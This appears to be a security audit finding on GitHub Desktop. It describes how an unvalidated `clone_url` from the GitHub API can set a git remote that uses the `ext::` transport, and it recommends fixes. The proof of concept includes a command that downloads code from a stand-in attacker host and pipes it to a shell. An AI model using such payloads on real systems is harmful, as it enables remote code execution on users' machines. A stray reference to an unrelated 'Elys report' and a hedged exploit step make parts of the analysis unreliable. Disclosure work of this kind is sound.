### Title
Unvalidated GitHub API `clone_url` propagated to `git remote set-url` / `remote add` enables dangerous-transport (`ext::`) argument injection - (File: `app/src/lib/stores/updates/update-remote-url.ts`, `app/src/lib/git/remote.ts`)

### Summary
The Elys report's root cause is a `ValidateBasic` that checks only one field (`Creator`) and skips format/content validation of an attacker-influenced field (`BrokerAddress`) before it is persisted and used downstream. The equivalent broken-invariant in this codebase is `updateRemoteUrl`, which takes `apiRepo.clone_url` returned by the GitHub API and — after only a *structural* comparison (`urlMatchesRemote`) and a *protocol-string* comparison — writes it directly as the repository's git remote URL via `gitStore.setRemoteURL()`, which shells out to `git remote set-url` without ever validating that the value is a safe `http(s)`/`ssh` URL.

### Finding Description
`updateRemoteUrl` in `app/src/lib/stores/updates/update-remote-url.ts` computes `protocolsMatch` and `urlsMatch` purely from `URL.parse()` and the regex-based `parseRemote()` in `app/src/lib/remote-parsing.ts`, then calls: [1](#0-0) 

`setRemoteURL` (and `addRemote`) construct the git command as a plain array without a `--` argument separator before the URL: [2](#0-1) [3](#0-2) 

Contrast this with `clone()`, which explicitly appends `'--'` before the URL to prevent the URL from being parsed as a flag: [4](#0-3) 

Because `set-url`/`remote add` do not use `--`, and because none of `urlMatchesRemote`, `parseRemote`, or `URL.parse` reject non-`http(s)`/`ssh` schemes (e.g. `ext::`, `fd::`, or a value starting with `-`), a `clone_url` value returned by a (compromised or malicious) GitHub Enterprise/API endpoint that the user has already added as an account can be written straight into the repository's git config as the remote URL. Git's `ext::` transport executes an arbitrary shell command whenever that remote is subsequently used for `fetch`/`pull`/`push`/background refresh — operations Desktop performs automatically and silently (e.g. periodic fetch, `repositoryWithRefreshedGitHubRepository`). No environment-level protocol allowlist (`GIT_ALLOW_PROTOCOL`/`protocol.ext.allow`) is set anywhere in `app/src/lib/git/environment.ts`, so the dangerous transport is not blocked at the process level either.

### Impact Explanation
If exploited, the corrupted value (`remote.url` in the local git config) is not merely wrong data — it is executable. Any subsequent background or user-initiated git network operation (auto-fetch, pull, push, background repository refresh triggered by `repositoryWithRefreshedGitHubRepository`) would invoke `git` with that remote, and an `ext::`-style URL causes git to spawn an arbitrary command supplied by the attacker, achieving code execution on the user's machine outside of any git-repo confinement. This satisfies the "attacker controls a GitHub API object … and the result is code execution" impact class.

### Likelihood Explanation
The trigger requires the user to have added an account (GitHub.com or, more plausibly, a GitHub Enterprise Server) whose `repos/{owner}/{name}` API response can be influenced by an attacker (e.g., a malicious/compromised GHES instance, a man-in-the-middle on an unpinned HTTP(S) API endpoint, or a malicious fork/rename flow the app already fetches via `fetchRepositoryCloneInfo`/`api-repositories-store.ts`). `updateRemoteUrl` is invoked automatically as part of normal repository refresh flow in `app-store.ts` without any user interaction, so once the malicious `clone_url` is served, Desktop applies it silently. This is a plausible but non-trivial path (needs a compromised/malicious API-serving endpoint the user already trusts), making likelihood moderate rather than high, but it does not require local/physical access, malware, or leaked credentials, so it fits the report's valid-impact criteria.

### Recommendation
Add explicit allow-list validation of the URL scheme/format before it is ever passed to `addRemote`/`setRemoteURL` (and ideally within `parseRemote`/`urlMatchesRemote` itself), restricting accepted values to `https://`, `http://`, `ssh://`, `git://`, or `git@host:owner/repo.git` SCP-like syntax, and rejecting anything else (including values starting with `-`). Additionally, insert `--` before the URL argument in `addRemote` and `setRemoteURL` (mirroring `clone.ts`) so a value can never be interpreted as a flag, and set `GIT_ALLOW_PROTOCOL`/`GIT_PROTOCOL_FROM_USER=0` in `envForRemoteOperation` as defense in depth against dangerous transports such as `ext::`, `fd::`, and `file::`.

### Proof of Concept
1. Add a GitHub Enterprise Server account in Desktop pointing at a server the attacker controls (or one susceptible to compromise/MITM).
2. Configure the API to return, for `GET repos/{owner}/{name}`, `"clone_url": "ext::sh -c 'curl attacker.example/x|sh'"` (any command).
3. Open a repository in Desktop already associated with that GitHub repository record; trigger a refresh (this happens automatically via `repositoryWithRefreshedGitHubRepository` → `updateRemoteUrl`). [5](#0-4) 
4. Because the previous remote URL matched the previously cached `cloneURL` (`remoteUrlUnchanged`) and the "protocol" substring superficially differs only in scheme text (or is crafted to pass the loose checks), `setRemoteURL` writes the `ext::` URL into `.git/config` as the `origin` URL.
5. The next automatic fetch/push (no further user action needed) causes git to execute the attacker's command via the `ext::` transport.
